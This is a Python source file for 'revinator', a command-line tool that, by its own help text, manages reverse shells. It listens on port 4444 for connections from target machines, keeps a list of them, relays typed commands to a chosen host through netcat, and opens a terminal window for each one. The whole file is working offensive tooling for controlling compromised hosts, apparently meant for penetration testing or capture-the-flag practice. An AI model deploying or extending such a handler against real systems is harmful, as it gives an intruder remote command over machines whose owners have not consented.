#!/usr/bin/env python

import argparse
import socket
import threading
import os
import pdb
import time

IP = ""
PORT = 4444
s = None
new_rev = {}
num_cons = 0
unique_addresses = []


from spawner import spawner
from connection import connection



def send(ip, cmd):
    global IP, PORT
    new_s = socket.socket()
    new_s.settimeout(1)
    new_s.connect(("127.0.0.1", PORT))
    st = str(ip) + "\n"
    new_s.sendall(st.encode())
    time.sleep(0.5)
    st = str(cmd) + "\n"
    new_s.sendall(st.encode())

    while True:
        try:
            r = new_s.recv(1024).decode()
        except:
            return
        if r:
            print(r)
        else:
            return

def new_window(ip):
    wd = (f"/tmp/{ip}")
    try:
        os.mkdir(wd)
    except:
        pass
    os.system(f"terminator -g /tmp/config -u --working-directory {wd} 2>/dev/null")

def remote(ip):
    wd = (f"/tmp/{ip}")
    global PORT, IP
    os.system(f"(printf {ip}; cat) | nc 127.0.0.1 {PORT}")
    quit()


def run_t(ip):
    wd = (f"/tmp/{ip}")
    os.system(f"terminator -g /tmp/config -u --working-directory {wd} 2>/dev/null")
    quit()



def run(quiet_mode=False):
    global s, IP, num_cons, unique_addresses
    connections = []
    waitingl = []
    rconnections = []

    HOST = ''
    global PORT
    print(f"\n\nserving on port {PORT}")

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((HOST, PORT))
        s.listen(1)
        waiting = 0
        while True:
            connections.append(s.accept())
            c = connections[-1]
            addr = c[1][0]
            sock = c[0]



            if addr == "127.0.0.1":    # connection from local user
                ip_unique_id = int(sock.recv(1024).decode().split("/")[-1].replace("\n",""))
                
                rconnections[ip_unique_id].connect(c)

            else:   # connection from target machine
                print(c[1])

                c = connection(c)
                rconnections.append(c)
                print(len(rconnections)-1, addr)








    



if __name__ == '__main__':

    os.system("cp config /tmp/config")
   
    parser = argparse.ArgumentParser(prog='revinator', description='manages reverse shells and creates terminator windows', epilog='Good luck!')

    # server options
    parser.add_argument('-l', '--listen', action='store_true', help="start the server")
    parser.add_argument('-i', '--ip', help="server option - serves on the specified IP address", default=IP)
    parser.add_argument('-p', '--port', help="server option - serves on the specified port", default=PORT)

    #client options
    parser.add_argument('-n', '--new-window', help="creates a new terminator window to IP#", default=0)
    parser.add_argument('-c', '--connect', help="connects to an IP# in current context", default=0)

    parser.add_argument('-q', '--quiet', action='store_true', help="server option - stops the automatic creation of terminator windows")
    parser.add_argument('-s', '--send', help="sends a command to the IP# specified by -c", default="")

    args = parser.parse_args()

    IP = args.ip
    PORT = int(args.port)

    if args.listen:
        try:
            if args.quiet:
                run(True)
                quit()
            run()
            quit()
        except KeyboardInterrupt:
            s.close()
            quit()


    if args.quiet:
        run(True)
        quit()

    if args.new_window:
        new_window(args.new_window)
        quit()

    if args.send:
        if args.connect:
            send(args.connect, args.send)
            quit()
        else:
            send(0, args.send)
            quit()

    if args.connect:
        remote(args.connect)
        quit()

    run()

